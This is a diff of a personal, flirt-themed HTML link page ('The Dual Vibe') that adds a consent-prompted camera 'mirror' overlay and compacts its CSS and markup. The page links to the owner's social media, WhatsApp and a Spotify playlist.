@@ -4,16 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>The Dual Vibe - Premium Edition</title>
-    
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@800;900&family=Nunito:ital,wght@0,700;0,900;1,700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; text-decoration: none; -webkit-tap-highlight-color: transparent; }
-        body, html { width: 100%; height: 100dvh; background: #000; overflow: hidden; font-family: 'Nunito', sans-serif; transition: background 0.5s; }
-        ::-webkit-scrollbar { display: none; }
-        * { -ms-overflow-style: none; scrollbar-width: none; }
+        * { margin: 0; padding: 0; box-sizing: border-box; text-decoration: none; -webkit-tap-highlight-color: transparent; font-family: 'Nunito', sans-serif; }
+        body, html { width: 100%; height: 100dvh; background: #000; overflow: hidden; transition: background 0.5s; }
+        ::-webkit-scrollbar { display: none; } * { -ms-overflow-style: none; scrollbar-width: none; }
 
+        /* GATEKEEPER */
         #gate { position: absolute; top: 0; left: 0; width: 100%; height: 100dvh; display: flex; z-index: 99999; transition: opacity 0.8s ease-in-out, transform 0.8s ease; }
         .door { flex: 1; height: 100%; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: flex 0.6s ease; font-size: clamp(1.5rem, 4vw, 3rem); font-weight: 900; border: none; outline: none; position: relative; overflow: hidden; }
         .door-girl { background: linear-gradient(135deg, #ff1493, #ff69b4); color: #fff; text-shadow: 2px 2px 10px #ff007f; text-transform: uppercase; }
@@ -22,36 +21,31 @@
         .custom-emoji { width: 1.2em; height: 1.2em; margin-left: 10px; display: inline-block; vertical-align: middle; filter: drop-shadow(0 0 8px #ff1493); animation: breathe 2s infinite alternate; pointer-events: none; }
         @keyframes breathe { 0% { transform: scale(1); filter: drop-shadow(0 0 5px #ff1493); } 100% { transform: scale(1.1); filter: drop-shadow(0 0 15px #ffb3d9); } }
 
+        /* FLOATING UI */
         #music-toggle-btn { position: fixed; top: 20px; left: 20px; z-index: 999999; width: 45px; height: 45px; border-radius: 50%; background: rgba(255, 255, 255, 0.2); border: 1px solid rgba(255,255,255,0.5); backdrop-filter: blur(10px); color: #fff; font-size: 1.2rem; display: none; justify-content: center; align-items: center; cursor: pointer; box-shadow: 0 5px 15px rgba(255,20,147,0.3); transition: all 0.3s ease; }
         #music-toggle-btn:hover { background: rgba(255, 255, 255, 0.4); transform: scale(1.1); }
+        #smart-toast { position: fixed; top: 25px; left: 50%; transform: translateX(-50%); background: rgba(255,20,147,0.95); color: white; padding: 12px 25px; border-radius: 30px; font-weight: 800; font-size: 1rem; z-index: 1000000; display: none; opacity: 0; transition: opacity 0.5s; box-shadow: 0 10px 30px rgba(255,20,147,0.4); text-align: center; border: 1px solid #fff;}
 
+        /* MODALS */
         #name-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100dvh; background: rgba(0,0,0,0.8); z-index: 100000; justify-content: center; align-items: center; backdrop-filter: blur(10px); flex-direction: column; opacity: 0; transition: opacity 0.5s; }
         .modal-box { background: rgba(255, 105, 180, 0.2); padding: 30px; border-radius: 20px; text-align: center; color: white; box-shadow: 0 10px 40px rgba(255,20,147,0.5); width: 90%; max-width: 350px; transform: translateY(50px); transition: transform 0.5s; border: 1px solid rgba(255,255,255,0.4); backdrop-filter: blur(20px); }
         .modal-box h2 { margin-bottom: 20px; font-weight: 900; font-size: 1.8rem; text-transform: uppercase; letter-spacing: 2px; }
-        .modal-box input { width: 100%; padding: 15px; border-radius: 10px; border: none; font-family: 'Nunito', sans-serif; font-size: 1.2rem; font-weight: 700; text-align: center; color: #ff1493; outline: none; background: rgba(255,255,255,0.9); }
-        .modal-box button { margin-top: 20px; width: 100%; padding: 15px; background: #fff; color: #ff1493; border: none; border-radius: 10px; font-size: 1.2rem; font-weight: 900; cursor: pointer; font-family: 'Nunito', sans-serif; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 5px 15px rgba(255,255,255,0.3); transition: 0.3s; }
-
+        .modal-box input { width: 100%; padding: 15px; border-radius: 10px; border: none; font-size: 1.2rem; font-weight: 700; text-align: center; color: #ff1493; outline: none; background: rgba(255,255,255,0.9); }
+        .modal-box button { margin-top: 20px; width: 100%; padding: 15px; background: #fff; color: #ff1493; border: none; border-radius: 10px; font-size: 1.2rem; font-weight: 900; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 5px 15px rgba(255,255,255,0.3); transition: 0.3s; }
+        
         .world { position: absolute; top: 0; left: 0; width: 100%; height: 100dvh; display: none; opacity: 0; overflow-y: auto; overflow-x: hidden; scroll-behavior: smooth; transition: opacity 1s ease-in-out; }
         .section { width: 100%; min-height: 100dvh; display: flex; justify-content: center; align-items: center; position: relative; padding: 40px 20px; overflow: hidden; }
         .scroll-down-icon { position: absolute; bottom: 5vh; left: 50%; transform: translateX(-50%); display: flex; flex-direction: column; align-items: center; gap: 5px; font-size: 0.8rem; font-weight: 900; letter-spacing: 2px; text-transform: uppercase; animation: floatUpDown 2s infinite ease-in-out; z-index: 50; opacity: 0.8; }
         .scroll-down-icon::after { content: '↓'; font-size: 1.5rem; }
         @keyframes floatUpDown { 0%, 100% {transform: translate(-50%, 0);} 50% {transform: translate(-50%, 10px);} }
-
         .para-bold { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; text-align: center; white-space: nowrap; font-size: clamp(3.5rem, 18vw, 12rem); font-weight: 900; text-transform: uppercase; color: transparent; z-index: 0; pointer-events: none; }
         .para-quote { position: absolute; top: 12%; left: 50%; transform: translateX(-50%); width: 90%; text-align: center; font-size: clamp(1rem, 4vw, 1.5rem); font-weight: 700; color: #fff; text-shadow: 0 5px 15px rgba(0,0,0,0.9); font-style: italic; z-index: 0; pointer-events: none; letter-spacing: 1px; }
-        .tap-badge { position: absolute; top: 15px; right: 15px; font-size: 0.6rem; font-family: 'Nunito', sans-serif; background: rgba(255,255,255,0.2); border: 1px solid rgba(255,255,255,0.5); padding: 4px 8px; border-radius: 20px; font-weight: 900; letter-spacing: 1px; animation: pulseTap 1.5s infinite; color: inherit; text-transform: uppercase; pointer-events: none; }
+        .tap-badge { position: absolute; top: 15px; right: 15px; font-size: 0.6rem; background: rgba(255,255,255,0.2); border: 1px solid rgba(255,255,255,0.5); padding: 4px 8px; border-radius: 20px; font-weight: 900; letter-spacing: 1px; animation: pulseTap 1.5s infinite; color: inherit; text-transform: uppercase; pointer-events: none; }
         @keyframes pulseTap { 0% { box-shadow: 0 0 0 0 rgba(255,255,255,0.4); } 70% { box-shadow: 0 0 10px 10px rgba(255,255,255,0); } 100% { box-shadow: 0 0 0 0 rgba(255,255,255,0); } }
-
-        #girl-bye-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100dvh; background: #050505; z-index: 9999999; display: none; flex-direction: column; justify-content: center; align-items: center; opacity: 0; transition: opacity 1.5s ease-in-out; }
-        .rose-icon { font-size: 6rem; margin-bottom: 20px; animation: floatRose 3s infinite ease-in-out; filter: drop-shadow(0 0 30px rgba(255,0,0,0.6)); }
-        @keyframes floatRose { 0%, 100% { transform: translateY(0) scale(1); } 50% { transform: translateY(-15px) scale(1.1); filter: drop-shadow(0 0 50px rgba(255,0,0,0.9)); } }
-        .bye-text { color: #fff; font-size: 2.5rem; font-family: 'Nunito', sans-serif; font-weight: 900; letter-spacing: 2px; text-shadow: 0 0 15px rgba(255,20,147,0.8); text-align: center; }
-        .bye-girl-btn { background: rgba(255,255,255,0.3); border: 2px solid #ff1493; color: #ff1493; padding: 15px 40px; font-family: 'Nunito', sans-serif; font-size: 1.2rem; font-weight: 900; letter-spacing: 2px; cursor: pointer; text-transform: uppercase; transition: 0.3s; border-radius: 30px; backdrop-filter: blur(10px); box-shadow: 0 10px 30px rgba(255,20,147,0.2); margin-top: 10px; }
-        .bye-girl-btn:hover { background: #ff1493; color: #fff; box-shadow: 0 0 30px #ff1493; transform: translateY(-5px); }
-
+        /* GIRL WORLD */
         #world-girl { background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%); color: #fff; cursor: crosshair; }
         #world-girl .scroll-down-icon { color: #ff1493; text-shadow: 0 2px 5px rgba(255,20,147,0.5); }
-        #world-girl .para-bold { -webkit-text-stroke: 2px rgba(255, 20, 147, 0.15); font-family: 'Nunito', sans-serif; }
+        #world-girl .para-bold { -webkit-text-stroke: 2px rgba(255, 20, 147, 0.15); }
         #world-girl .para-quote { color: #ff1493; text-shadow: none; font-weight: 900; }
         .name-highlight { color: #ff1493; text-shadow: 0 0 8px rgba(255,20,147,0.5); font-style: italic; font-weight: 900; letter-spacing: 1px; }
         .cute-gif { width: 120px; height: 120px; object-fit: cover; border-radius: 20px; margin: 0 auto 15px auto; display: block; box-shadow: 0 10px 20px rgba(255,20,147,0.2); animation: floatGif 3s infinite ease-in-out; }
@@ -62,11 +56,20 @@
         .g-title i { font-size: 1.8rem; display: block; margin-bottom: 10px; color: #ff69b4; }
         .g-flirt { font-size: 1.1rem; font-weight: 700; line-height: 1.6; color: #444; }
         .main-flirt { background: rgba(255, 255, 255, 0.3); padding: 30px; border-radius: 20px; text-align: center; font-size: 1.3rem; font-weight: 900; box-shadow: 0 15px 35px rgba(0,0,0,0.1); color: #333; backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.6); z-index: 10; line-height: 1.6; width: 90%; max-width: 450px; }
+        .bye-girl-btn { background: rgba(255,255,255,0.4); border: 2px solid #ff1493; color: #ff1493; padding: 12px 30px; font-size: 1.1rem; font-weight: 900; letter-spacing: 1px; cursor: pointer; text-transform: uppercase; transition: 0.3s; border-radius: 30px; backdrop-filter: blur(10px); box-shadow: 0 10px 30px rgba(255,20,147,0.2); margin-top: 10px; }
+        .bye-girl-btn:hover { background: #ff1493; color: #fff; box-shadow: 0 0 30px #ff1493; transform: translateY(-5px); }
+
         .sparkle { position: absolute; pointer-events: none !important; z-index: 999999; font-size: 24px; animation: pop 1s ease-out forwards; text-shadow: 0 0 10px rgba(255,255,255,0.8); }
         @keyframes pop { 0% { transform: scale(0) rotate(0deg); opacity: 1; } 100% { transform: scale(1.2) rotate(45deg) translateY(-40px); opacity: 0; } }
         .ripple { position: absolute; border-radius: 50%; border: 2px solid rgba(255, 20, 147, 0.6); pointer-events: none !important; width: 20px; height: 20px; transform: translate(-50%, -50%) scale(1); z-index: 999998; animation: rippleAnim 0.6s ease-out forwards; }
         @keyframes rippleAnim { 0% { transform: translate(-50%, -50%) scale(1); opacity: 1; } 100% { transform: translate(-50%, -50%) scale(10); opacity: 0; } }
 
+        #girl-bye-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100dvh; background: #050505; z-index: 9999999; display: none; flex-direction: column; justify-content: center; align-items: center; opacity: 0; transition: opacity 1.5s ease-in-out; }
+        .rose-icon { font-size: 6rem; margin-bottom: 20px; animation: floatRose 3s infinite ease-in-out; filter: drop-shadow(0 0 30px rgba(255,0,0,0.6)); }
+        @keyframes floatRose { 0%, 100% { transform: translateY(0) scale(1); } 50% { transform: translateY(-15px) scale(1.1); filter: drop-shadow(0 0 50px rgba(255,0,0,0.9)); } }
+        .bye-text { color: #fff; font-size: 2.5rem; font-weight: 900; letter-spacing: 2px; text-shadow: 0 0 15px rgba(255,20,147,0.8); text-align: center; }
+
+        /* BOY WORLD */
         #world-boy { background: #050505; font-family: 'Montserrat', sans-serif; position: relative; }
         #spidey-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100dvh; z-index: 1; pointer-events: none; transition: opacity 1s; }
         .glitch-text { animation: glitch 3s infinite; }
@@ -90,6 +93,24 @@
         .terminate-btn { background: transparent; border: 2px solid #ff0000; color: #ff0000; padding: 15px 30px; font-family: 'Montserrat', sans-serif; font-size: 1.2rem; font-weight: 900; letter-spacing: 3px; cursor: pointer; text-transform: uppercase; transition: 0.3s; border-radius: 5px; margin-top: 20px; z-index: 100; position: relative; overflow: hidden; }
         .terminate-btn:hover { background: #ff0000; color: #000; box-shadow: 0 0 30px #ff0000; }
         #offline-msg { display: none; color: #ff0000; font-size: clamp(2.5rem, 8vw, 5rem); font-weight: 900; letter-spacing: 5px; text-shadow: 0 0 20px red; animation: glitch 0.3s infinite; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; text-align: center; z-index: 999999; }
+        /* 📸 MAGIC MIRROR & CAMERA CSS 📸 */
+        #permission-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100dvh; background: rgba(255, 182, 193, 0.7); z-index: 1000000; justify-content: center; align-items: center; backdrop-filter: blur(8px); opacity: 0; transition: opacity 0.5s; }
+        .cute-p-box { background: #ffffff; padding: 35px 25px; border-radius: 30px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 20px 50px rgba(255, 20, 147, 0.3); border: 4px solid #ffb6c1; transform: translateY(50px); transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .pic-gif { width: 100px; height: 100px; object-fit: contain; margin: 0 auto 15px auto; display: block; animation: floatGif 3s infinite ease-in-out; }
+        .cute-p-box h3 { color: #ff1493; font-size: 1.35rem; font-weight: 900; margin-bottom: 12px; line-height: 1.4; }
+        .cute-p-box p { color: #555; font-size: 1.05rem; font-weight: 700; margin-bottom: 25px; }
+        .btn-yes { background: linear-gradient(135deg, #ff1493, #ff69b4); color: white; border: none; width: 100%; padding: 16px; border-radius: 20px; font-size: 1.1rem; font-weight: 900; margin-bottom: 12px; cursor: pointer; box-shadow: 0 8px 20px rgba(255, 20, 147, 0.4); transition: 0.3s; }
+        .btn-yes:active { transform: scale(0.95); }
+        .btn-no { background: transparent; color: #ff1493; border: 2px solid #ff69b4; width: 100%; padding: 14px; border-radius: 20px; font-size: 1.05rem; font-weight: 800; cursor: pointer; transition: 0.3s; }
+        
+        #flash { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100dvh; background: white; z-index: 9999999; opacity: 1; }
+        #mirror-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100dvh; background: #000; z-index: 999999; flex-direction: column; justify-content: center; align-items: center; opacity: 0; transition: opacity 1s ease-in-out; }
+        .video-container { position: absolute; top:0; left:0; width:100%; height:100%; }
+        .video-container::after { content: ''; position: absolute; top:0; left:0; width:100%; height:100%; box-shadow: inset 0 0 100px rgba(255, 215, 0, 0.2); pointer-events: none; }
+        #mirror-video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); filter: sepia(0.2) contrast(1.1) brightness(1.1) saturate(1.3); }
+        .name-frame { position: absolute; top: 25px; left: 25px; color: #fff; font-weight: 900; font-size: 1.2rem; letter-spacing: 2px; text-shadow: 0 2px 10px rgba(0,0,0,0.8), 0 0 20px rgba(255,215,0,0.5); z-index: 1000; text-transform: uppercase; }
+        .mirror-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; color: #fff; font-size: 1.8rem; font-weight: 900; text-shadow: 0 0 20px rgba(255,215,0,0.6), 2px 2px 15px rgba(0,0,0,0.9); width: 90%; opacity: 0; transition: opacity 1.5s ease-in-out; z-index: 1000; line-height: 1.4; }
+        .mirror-text span { font-size: 1.35rem; color: #ffd700; font-weight: 800; margin-top: 15px; display: block; text-shadow: 0 2px 10px rgba(0,0,0,0.9); }
     </style>
 </head>
 <body>
@@ -98,95 +119,72 @@
     <audio id="meme-audio" src="fahhh.mp3" preload="auto"></audio>
     <audio id="click-audio" src="click.mp3" preload="auto"></audio>
 
-    <div id="music-toggle-btn" onclick="toggleMusic()">
-        <i class="fas fa-music"></i>
-    </div>
+    <div id="smart-toast">Message Here</div>
+
+    <div id="music-toggle-btn" onclick="toggleMusic()"><i class="fas fa-music"></i></div>
 
     <div id="gate">
         <button class="door door-girl" onclick="openGirlModal()">
             FOR HER 
-            <svg class="custom-emoji" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                <path d="M50 85 C 15 55, 5 25, 25 15 C 40 8, 50 25, 50 25 C 50 25, 60 8, 75 15 C 95 25, 85 55, 50 85 Z" fill="url(#pinkGradient)"/>
-                <path d="M50 70 C 30 50, 20 30, 35 25 C 45 20, 50 35, 50 35 C 50 35, 55 20, 65 25 C 80 30, 70 50, 50 70 Z" fill="rgba(255, 255, 255, 0.4)"/>
-                <defs><linearGradient id="pinkGradient" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ff1493" /><stop offset="100%" stop-color="#ffb3d9" /></linearGradient></defs>
-            </svg>
+            <svg class="custom-emoji" viewBox="0 0 100 100"><path d="M50 85 C 15 55, 5 25, 25 15 C 40 8, 50 25, 50 25 C 50 25, 60 8, 75 15 C 95 25, 85 55, 50 85 Z" fill="#ffb3d9"/></svg>
         </button>
         <button class="door door-boy" onclick="enterBoyWorld()">FOR HIM 🕷️</button>
     </div>
 
     <div id="name-modal">
-        <div class="modal-box">
-            <h2>Who's there?</h2>
-            <input type="text" id="girl-name-input" placeholder="Your name" autocomplete="off">
-            <button onclick="processGirlName()">ENTER</button>
-        </div>
+        <div class="modal-box"><h2>Who's there?</h2><input type="text" id="girl-name-input" placeholder="Your name" autocomplete="off"><button onclick="processGirlName()">ENTER</button></div>
     </div>
-
-    <div id="girl-bye-overlay">
-        <div class="rose-icon">🌹</div>
-        <div class="bye-text">Bye, Take care<br><span style="font-size:1.5rem; color:#ffb3d9; font-weight:700; margin-top: 10px; display: block;">Alvida...</span></div>
-    </div>
-
     <div id="world-girl" class="world">
-
         <div class="section">
             <div class="para-bold para-layer center-x center-y" data-speed="0.2">NOOR</div>
-            <div class="main-flirt">
-                <img src="start.gif" class="cute-gif" alt="Cute Start">
-                <span id="dynamic-greeting"></span>
-            </div>
+            <div class="main-flirt"><img src="start.gif" class="cute-gif" alt="Start"><span id="dynamic-greeting"></span></div>
             <div class="scroll-down-icon">Scroll</div>
         </div>
         
         <div class="section">
             <div class="para-bold para-layer center-x center-y" data-speed="0.15">NASHA</div>
-            <a href="https://www.instagram.com/sk_yaser_urs?igsh=MXE5a2E4ZzR1aTFjYg==" class="g-card scroll-item" onclick="logActivity('Opened Instagram (Nasha)')">
-                <span class="tap-badge">TAP 👆</span>
-                <img src="insta.gif" class="cute-gif" alt="Insta Cat">
-                <div class="g-title"><i class="fab fa-instagram"></i> Instagram</div>
-                <div class="g-flirt" id="flirt-insta"></div>
+            <a href="https://www.instagram.com/sk_yaser_urs?igsh=MXE5a2E4ZzR1aTFjYg==" class="g-card scroll-item" onclick="logActivity('Opened Instagram')">
+                <span class="tap-badge">TAP 👆</span><img src="insta.gif" class="cute-gif" alt="Insta">
+                <div class="g-title"><i class="fab fa-instagram"></i> Instagram</div><div class="g-flirt" id="flirt-insta"></div>
             </a>
         </div>
         
         <div class="section">
             <div class="para-bold para-layer center-x center-y" data-speed="0.25">AADAT</div>
-            <a href="https://www.snapchat.com/add/arfat249799?share_id=NesmCnRomaE&locale=en-GB" class="g-card scroll-item" onclick="logActivity('Opened Snapchat (Aadat)')">
-                <span class="tap-badge">TAP 👆</span>
-                <img src="snap.gif" class="cute-gif" alt="Snap Cat">
-                <div class="g-title"><i class="fab fa-snapchat-ghost"></i> Snapchat</div>
-                <div class="g-flirt" id="flirt-snap"></div>
+            <a href="https://www.snapchat.com/add/arfat249799?share_id=NesmCnRomaE&locale=en-GB" class="g-card scroll-item" onclick="logActivity('Opened Snapchat')">
+                <span class="tap-badge">TAP 👆</span><img src="snap.gif" class="cute-gif" alt="Snap">
+                <div class="g-title"><i class="fab fa-snapchat-ghost"></i> Snapchat</div><div class="g-flirt" id="flirt-snap"></div>
             </a>
         </div>
         
         <div class="section">
             <div class="para-bold para-layer center-x center-y" data-speed="0.1">RAATEN</div>
-            <a href="https://api.whatsapp.com/send?phone=919356047251" class="g-card scroll-item" onclick="logActivity('Opened WhatsApp (Raaten)')">
-                <span class="tap-badge">TAP 👆</span>
-                <img src="whatsapp.gif" class="cute-gif" alt="WhatsApp Cat">
-                <div class="g-title"><i class="fab fa-whatsapp"></i> WhatsApp</div>
-                <div class="g-flirt" id="flirt-wp"></div>
+            <a href="https://api.whatsapp.com/send?phone=919356047251" class="g-card scroll-item" onclick="logActivity('Opened WhatsApp')">
+                <span class="tap-badge">TAP 👆</span><img src="whatsapp.gif" class="cute-gif" alt="WA">
+                <div class="g-title"><i class="fab fa-whatsapp"></i> WhatsApp</div><div class="g-flirt" id="flirt-wp"></div>
             </a>
         </div>
         
         <div class="section">
             <div class="para-bold para-layer center-x center-y" data-speed="0.2">RAAZ</div>
-            <a href="https://www.instagram.com/yaser_official_for_you?igsh=ZXNzZ3dnYXZ5YnBo" class="g-card scroll-item" onclick="logActivity('Opened Secret Vibe (Raaz)')">
-                <span class="tap-badge">TAP 👆</span>
-                <img src="secret.gif" class="cute-gif" alt="Secret Cat">
-                <div class="g-title"><i class="fab fa-instagram"></i> Secret Vibe</div>
-                <div class="g-flirt" id="flirt-secret"></div>
+            <a href="https://www.instagram.com/yaser_official_for_you?igsh=ZXNzZ3dnYXZ5YnBo" class="g-card scroll-item" onclick="logActivity('Opened Secret Vibe')">
+                <span class="tap-badge">TAP 👆</span><img src="secret.gif" class="cute-gif" alt="Secret">
+                <div class="g-title"><i class="fab fa-instagram"></i> Secret Vibe</div><div class="g-flirt" id="flirt-secret"></div>
             </a>
         </div>
 
-        <div class="section" onmouseenter="logActivity('Scrolled to Spotify (Melody)')">
+        <div class="section" onmouseenter="logActivity('Scrolled to Spotify')">
             <div class="para-bold para-layer center-x center-y" data-speed="0.15">MELODY</div>
-            <div class="spotify-wrap spotify-girl scroll-item">
-                <iframe style="border-radius:12px" src="Https://open.spotify.com/embed/playlist/1HJZWn6Z8UGrK2SxECf9bb?si=USwfLLxJS0SLTKRneUZJgQ" width="100%" height="152" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
-            </div>
+            <div class="spotify-wrap spotify-girl scroll-item"><iframe style="border-radius:12px" src="Https://open.spotify.com/embed/playlist/1HJZWn6Z8UGrK2SxECf9bb?si=USwfLLxJS0SLTKRneUZJgQ" width="100%" height="152" frameBorder="0" allowfullscreen="" loading="lazy"></iframe></div>
         </div>
 
-        <div class="section">
+        <div class="section" style="flex-direction: column; gap: 40px;">
             <div class="para-bold para-layer center-x center-y" data-speed="0.2">ALVIDA</div>
+            
+            <div class="scroll-item" style="text-align: center; z-index: 10;">
+                <button class="bye-girl-btn" onclick="showMirrorPopup()">Duniya ki sabse khubsurat cheez dekhni hai? 🙈</button>
+            </div>
+
             <div class="scroll-item" style="text-align: center; z-index: 10; display: flex; flex-direction: column; align-items: center; gap: 15px;">
                 <img src="end.gif" class="cute-gif" alt="Bye Cat">
                 <div class="g-flirt" style="color: #fff; text-shadow: 0 0 10px #ff1493; font-size: 1.2rem;">Safar yahan khatam hota hai...</div>
@@ -195,383 +193,181 @@
         </div>
         <div style="height: 5vh;"></div>
     </div>
+    <div id="girl-bye-overlay">
+        <div class="rose-icon">🌹</div>
+        <div class="bye-text">Bye, Take care<br><span style="font-size:1.5rem; color:#ffb3d9; font-weight:700; margin-top: 10px; display: block;">Alvida...</span></div>
+    </div>
+
     <div id="world-boy" class="world">
         <div id="offline-msg">SYSTEM OFFLINE<br><span style="font-size: 3.5rem; text-shadow: none; display: inline-block; margin-top: 15px; animation: none;">😂</span></div>
-        
         <canvas id="spidey-canvas"></canvas>
+        <div class="section boy-content" style="flex-direction: column;"><div class="yaser-name">YASER</div><div class="yaser-bio">Science 🧬 | Code 💻 | Web 🌐 | Tech ⚙️</div><div class="scroll-down-icon" style="bottom: 10vh;">Scroll</div></div>
         
-        <div class="section boy-content" style="flex-direction: column;">
-            <div class="yaser-name">YASER</div>
-            <div class="yaser-bio">Science 🧬  |  Code 💻  |  Web 🌐  |  Tech ⚙️</div>
-            <div class="scroll-down-icon" style="bottom: 10vh;">Scroll</div>
-        </div>
-        
-        <div class="section boy-content">
-            <div class="para-bold para-layer center-x center-y" data-speed="0.15">SPIDERMAN</div>
-            <div class="para-quote para-layer center-x" data-speed="0.35">"With great power comes great responsibility."</div>
-            <div class="b-card scroll-item" onclick="boyCardClick(this, 'https://www.instagram.com/sk_yaser_urs?igsh=MXE5a2E4ZzR1aTFjYg==', 'Main Profile (Insta)')">
-                <span class="tap-badge-boy">TAP [↗]</span>
-                <span class="b-num">01</span>
-                <span class="b-title"><i class="fab fa-instagram"></i> Main Profile</span>
-            </div>
-        </div>
-        
-        <div class="section boy-content">
-            <div class="para-bold para-layer center-x center-y" data-speed="0.25">SHADOWS</div>
-            <div class="para-quote para-layer center-x" data-speed="0.45">"We operate in the dark."</div>
-            <div class="b-card scroll-item" onclick="boyCardClick(this, 'https://www.instagram.com/yaser_official_for_you?igsh=ZXNzZ3dnYXZ5YnBo', 'Shadow Identity (Insta)')">
-                <span class="tap-badge-boy">TAP [↗]</span>
-                <span class="b-num">02</span>
-                <span class="b-title"><i class="fab fa-instagram"></i> Shadow Identity</span>
-            </div>
-        </div>
-        
-        <div class="section boy-content">
-            <div class="para-bold para-layer center-x center-y" data-speed="0.1">WEB-SLINGER</div>
-            <div class="para-quote para-layer center-x" data-speed="0.3">"My spider-sense is tingling."</div>
-            <div class="b-card scroll-item" onclick="boyCardClick(this, 'https://www.snapchat.com/add/arfat249799?share_id=NesmCnRomaE&locale=en-GB', 'Snapchat Base')">
-                <span class="tap-badge-boy">TAP [↗]</span>
-                <span class="b-num">03</span>
-                <span class="b-title"><i class="fab fa-snapchat-ghost"></i> Snapchat Base</span>
-            </div>
-        </div>
-        
-        <div class="section boy-content">
-            <div class="para-bold para-layer center-x center-y" data-speed="0.2">VENOM</div>
-            <div class="para-quote para-layer center-x" data-speed="0.4">"Embrace the darkness."</div>
-            <div class="b-card scroll-item" onclick="boyCardClick(this, 'https://api.whatsapp.com/send?phone=919356047251', 'WhatsApp Comms')">
-                <span class="tap-badge-boy">TAP [↗]</span>
-                <span class="b-num">04</span>
-                <span class="b-title"><i class="fab fa-whatsapp"></i> WhatsApp Comms</span>
-            </div>
-        </div>
-        
-        <div class="section boy-content" onmouseenter="logActivity('Scrolled to Boy Spotify')">
-            <div class="para-bold para-layer center-x center-y" data-speed="0.15">SILENCE</div>
-            <div class="para-quote para-layer center-x" data-speed="0.35">"Let the music speak."</div>
-            <div class="spotify-wrap spotify-boy scroll-item">
-                <iframe style="border-radius:12px" src="Https://open.spotify.com/embed/playlist/1HJZWn6Z8UGrK2SxECf9bb?si=USwfLLxJS0SLTKRneUZJgQ" width="100%" height="152" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
-            </div>
-        </div>
+        <div class="section boy-content"><div class="para-bold para-layer center-x center-y" data-speed="0.15">SPIDERMAN</div><div class="b-card scroll-item" onclick="boyCardClick(this, 'https://www.instagram.com/sk_yaser_urs?igsh=MXE5a2E4ZzR1aTFjYg==')"><span class="b-num">01</span><span class="b-title"><i class="fab fa-instagram"></i> Main Profile</span></div></div>
+        <div class="section boy-content"><div class="para-bold para-layer center-x center-y" data-speed="0.25">SHADOWS</div><div class="b-card scroll-item" onclick="boyCardClick(this, 'https://www.instagram.com/yaser_official_for_you?igsh=ZXNzZ3dnYXZ5YnBo')"><span class="b-num">02</span><span class="b-title"><i class="fab fa-instagram"></i> Shadow Identity</span></div></div>
+        <div class="section boy-content"><div class="para-bold para-layer center-x center-y" data-speed="0.1">WEB-SLINGER</div><div class="b-card scroll-item" onclick="boyCardClick(this, 'https://www.snapchat.com/add/arfat249799?share_id=NesmCnRomaE&locale=en-GB')"><span class="b-num">03</span><span class="b-title"><i class="fab fa-snapchat-ghost"></i> Snapchat Base</span></div></div>
+        <div class="section boy-content"><div class="para-bold para-layer center-x center-y" data-speed="0.2">VENOM</div><div class="b-card scroll-item" onclick="boyCardClick(this, 'https://api.whatsapp.com/send?phone=919356047251')"><span class="b-num">04</span><span class="b-title"><i class="fab fa-whatsapp"></i> WhatsApp Comms</span></div></div>
+        <div class="section boy-content"><div class="para-bold para-layer center-x center-y" data-speed="0.15">SILENCE</div><div class="spotify-wrap spotify-boy scroll-item"><iframe style="border-radius:12px" src="Https://open.spotify.com/embed/playlist/1HJZWn6Z8UGrK2SxECf9bb?si=USwfLLxJS0SLTKRneUZJgQ" width="100%" height="152" frameBorder="0" allowfullscreen=""></iframe></div></div>
+        <div class="section boy-content end-screen" style="flex-direction: column; text-align: center;"><button class="terminate-btn" id="terminate-btn" onclick="triggerMeltdown()">TERMINATE CONNECTION</button></div>
+    </div>
 
-        <div class="section boy-content end-screen" style="flex-direction: column; text-align: center; justify-content: center;">
-            <div class="para-bold para-layer center-x center-y" data-speed="0.2">SYSTEM</div>
-            <button class="terminate-btn" id="terminate-btn" onclick="triggerMeltdown()">TERMINATE CONNECTION</button>
+    <div id="permission-modal">
+        <div class="cute-p-box" id="cute-p-box">
+            <img src="picture.gif" class="pic-gif" alt="Smile">
+            <h3>Is haseen pal ko thoda aur khubsurat banayein?</h3>
+            <p>Can I take your picture... please smile! ✨</p>
+            <button class="btn-yes" onclick="startMirror(true)">Haan, bilkul! 😊</button>
+            <button class="btn-no" onclick="startMirror(false)">Nahi, sharam aa rahi hai 🙈</button>
         </div>
-        <div style="height: 5vh;" class="boy-content"></div>
+    </div>
+
+    <div id="flash"></div>
+
+    <div id="mirror-overlay">
+        <div class="video-container"><video id="mirror-video" autoplay playsinline></video></div>
+        <div class="name-frame" id="name-frame">Name ✨</div>
+        <div class="mirror-text" id="mirror-text"></div>
     </div>
